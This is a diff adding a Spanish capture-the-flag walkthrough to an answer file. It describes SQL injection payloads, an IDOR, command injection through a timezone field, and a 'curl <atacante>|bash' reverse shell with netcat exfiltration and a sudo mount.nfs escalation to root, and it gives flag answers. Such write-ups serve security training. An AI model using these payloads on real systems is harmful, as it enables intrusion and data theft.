@@ -17,6 +17,29 @@
 
 ### Task 1: Investigate the server of an associate
 
+**Explicación:** La cadena arranca en el puerto 80 (hotel "The 'Ton"). El JS de `/new-booking` lee la cookie `BOOKING_KEY` y la manda a `/api/booking-info`; la cookie va codificada en **Base58** y contiene `booking_id:<7 dígitos>`. El endpoint es vulnerable a **SQLi**: con la comilla da `bad request`, comentando con `';-- -` vuelve a `not found`, `ORDER BY` revela 2 columnas y `UNION SELECT 1,2` confirma la inyección. Se identifica SQLite 3.42.0 y se enumera `sqlite_master` hasta volcar `email_access`, donde están las credenciales `pdenton:<password>` del portal NYComm.
+
+```sql
+booking_key=<base58('booking_id:1234567')>
+# payloads UNION
+';-- -
+' ORDER BY 2--
+' UNION SELECT 1,2--
+' UNION SELECT 1,sql FROM sqlite_master--
+```
+
+Con las credenciales se accede al portal del puerto 4346 y, en `/mail`, un IDOR `message_id` (respuestas en base64) revela la Web Flag en el mensaje `3`. A continuación, el WebSocket `ws://<host>/ws` envía una zona horaria que el servidor pasa a `TZ=<zona> date`: inyectando `Cuba; <cmd>;` se ejecutan comandos. Como el firewall solo permite salir por `80/443`, se usa `curl <atacante>|bash` con un listener en 443 para obtener shell como **gilbert**; en `/srv/.dad` está la contraseña de **sandra** (User Flag en `/home/sandra/user.txt`); la de **jojo** está oculta en `boss.jpg` (`nc -w 3 <atacante> 443 < boss.jpg`). `sudo -l` como jojo permite `mount.nfs` como root.
+
+```bash
+# reverse shell vía TZ
+UTC;curl http://<atacante>:80/rev.sh|bash;
+# jojo: sudo -l -> /usr/sbin/mount.nfs
+# montar share NFS del atacante sobre /usr/sbin y sustituir mount.nfs
+sudo /usr/sbin/mount.nfs
+```
+
+Con `sudo /usr/sbin/mount.nfs` reemplazado por `/bin/sh` (share NFS montado sobre `/usr/sbin/`, sin `no_root_squash`) se obtiene shell root y la Root Flag.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | What is the Web Flag? | `thm{adb5b797ee0d01a8c052dbee46fbc065e8c52afd}` |
@@ -24,6 +47,8 @@
 | 3 | What is the Root Flag? | `<flag_generada_por_instancia>` (en `/root/root.txt`; formato de ejemplo visto en writeups: `thm{7f6[...]d3b}`, redactado por los autores. *Reconstruido por web.*) |
 
 ### Task 2: Credits
+
+**Explicación:** Tarea de cierre con los créditos de la sala (autor: Chris Pritchard). No requiere respuesta.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
